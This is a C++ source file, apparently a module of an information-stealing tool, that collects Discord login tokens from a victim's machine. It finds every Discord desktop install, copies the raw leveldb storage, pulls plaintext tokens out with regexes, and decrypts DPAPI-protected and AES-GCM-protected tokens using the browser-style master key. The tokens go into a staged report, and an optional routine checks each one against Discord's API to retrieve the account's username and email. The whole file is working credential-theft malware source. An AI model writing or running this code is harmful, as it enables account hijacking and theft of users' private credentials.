// Discord token collection: all desktop branches, leveldb raw copy + token
// regex sweep + DPAPI-encrypted (dQw4w9WgXcQ) and AES-GCM (v10) values.
#include "../modules.h"
#include "../config.h"
#include "../core/obf.h"
#include "../core/sys.h"
#include "../core/http.h"
#include "../core/b64.h"
#include "../core/crypto.h"
#include "../core/dpapi.h"
#include "../core/json.h"
#include "../core/log.h"
#include <regex>
#include <sstream>

namespace {

struct Branch { std::string path; std::string name; };

std::vector<Branch> discord_branches() {
    std::vector<Branch> out;
    std::string appdata = util::expand_env("%APPDATA%");
    std::string local = util::expand_env("%LOCALAPPDATA%");
    out.push_back({util::join(appdata, "discord"), "discord"});
    out.push_back({util::join(appdata, "discordptb"), "discordptb"});
    out.push_back({util::join(appdata, "discordcanary"), "discordcanary"});
    out.push_back({util::join(appdata, "discorddevelopment"), "discorddevelopment"});
    // newer builds store under LocalAppData
    out.push_back({util::join(local, "Discord"), "discord-local"});
    return out;
}

std::string read_all_bytes(const std::string& path) {
    std::vector<uint8_t> d;
    if (!util::read_file(path, d)) return {};
    return std::string(d.begin(), d.end());
}

// collect tokens from a leveldb dump: plaintext + encrypted values
void scan_leveldb_file(const std::string& path, const std::string& branch_name,
                       const std::string& master_key_b64,
                       std::map<std::string, std::string>& tokens_out,
                       std::map<std::string, std::string>& encrypted_out) {
    std::string blob = read_all_bytes(path);
    if (blob.empty()) return;

    // plaintext tokens
    static const std::regex re1(R"(([\w-]{24}\.[\w-]{6}\.[\w-]{27}))");
    static const std::regex re2(R"((mfa\.[\w-]{84}))");
    for (auto it = std::sregex_iterator(blob.begin(), blob.end(), re1); it != std::sregex_iterator(); ++it)
        tokens_out[it->str()] = branch_name;
    for (auto it = std::sregex_iterator(blob.begin(), blob.end(), re2); it != std::sregex_iterator(); ++it)
        tokens_out[it->str()] = branch_name;

    // dQw4w9WgXcQ:<base64 dpapi blob>
    static const std::string dq = "dQw4w9WgXcQ:";
    size_t pos = 0;
    while ((pos = blob.find(dq, pos)) != std::string::npos) {
        pos += dq.size();
        // read base64 run
        std::string b64;
        while (pos < blob.size()) {
            char c = blob[pos];
            if (isalnum((unsigned char)c) || c == '+' || c == '/' || c == '=') { b64 += c; ++pos; }
            else break;
        }
        if (b64.size() < 32) continue;
        auto dec = dpapi::unprotect_b64_to_string(b64);
        if (dec && !dec->empty())
            encrypted_out[*dec] = branch_name + " (dpapi)";
    }

    // v10 AES-GCM blobs: base64 string starting with v10 -> decode -> decrypt
    if (!master_key_b64.empty()) {
        auto key = util::b64_decode(master_key_b64);
        auto key_raw = dpapi::unprotect(std::vector<uint8_t>(key.begin() + 5, key.end()));
        if (key_raw && key_raw->size() == 32) {
            static const std::regex rev(R"(v10([A-Za-z0-9+/]{60,120}))");
            for (auto it = std::sregex_iterator(blob.begin(), blob.end(), rev); it != std::sregex_iterator(); ++it) {
                auto raw = util::b64_decode(it->str());
                if (raw.size() >= 15 + 16 + 1 && raw.size() <= 15 + 16 + 200) {
                    std::vector<uint8_t> nonce(raw.begin() + 3, raw.begin() + 15);
                    std::vector<uint8_t> tag(raw.end() - 16, raw.end());
                    std::vector<uint8_t> ct(raw.begin() + 15, raw.end() - 16);
                    auto pt = crypto::aes_gcm_decrypt(*key_raw, nonce, ct, tag);
                    if (pt && !pt->empty()) {
                        std::string s(pt->begin(), pt->end());
                        if (s.find_first_not_of("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ.-_") == std::string::npos && s.size() > 20)
                            encrypted_out[s] = branch_name + " (aesgcm)";
                    }
                }
            }
        }
    }
}

std::string token_account_info(const std::string& token) {
    // lightweight validation: one API call per token
    auto r = http::request("GET", "https://discord.com/api/v10/users/@me",
                           {{"Authorization", token}},
                           {});
    if (!r.ok()) return "";
    try {
        auto j = util::json::parse(r.body);
        std::string s = j.value("username", "") + "#" + j.value("discriminator", "");
        if (j.contains("email")) s += " | " + j.value("email", "");
        return s;
    } catch (...) {
        return "";
    }
}

} // namespace

namespace mod {

void discord(const std::string& staging) {
    std::map<std::string, std::string> all_tokens, encrypted;
    std::ostringstream report;

    for (auto& b : discord_branches()) {
        if (!util::is_dir(b.path)) continue;
        std::string ldb = util::join(util::join(b.path, "Local Storage"), "leveldb");
        if (util::is_dir(ldb)) {
            // stage raw leveldb for offline analysis
            std::string dest = util::join(staging, "discord\\" + b.name);
            util::copy_dir_recursive(ldb, dest, {"*.ldb", "*.log"}, 16 * 1024 * 1024);

            // master key for v10 values
            std::string master;
            util::json ls;
            if (util::read_json_file(util::join(b.path, "Local State"), ls)) {
                try {
                    master = ls["os_crypt"]["encrypted_key"].get<std::string>();
                } catch (...) {}
            }
            for (auto& f : util::list_dir(ldb)) {
                std::string lower = util::to_lower(f);
                if (util::ends_with(lower, ".ldb") || util::ends_with(lower, ".log"))
                    scan_leveldb_file(f, b.name, master, all_tokens, encrypted);
            }
        }
    }

    for (auto& [tok, br] : all_tokens) report << br << " plain: " << tok << "\r\n";
    for (auto& [tok, br] : encrypted) report << br << " decrypted: " << tok << "\r\n";

    stage::stage_text("discord", "tokens.txt", report.str());
    stage::note("discord", std::to_string(all_tokens.size()) + " plaintext, " +
                            std::to_string(encrypted.size()) + " decrypted tokens");
#if 0
    // optional live validation (disabled by default: noisy)
    for (auto& [tok, br] : all_tokens) {
        auto info = token_account_info(tok);
        if (!info.empty()) stage::note("discord", "valid: " + info);
    }
#endif
}

} // namespace mod
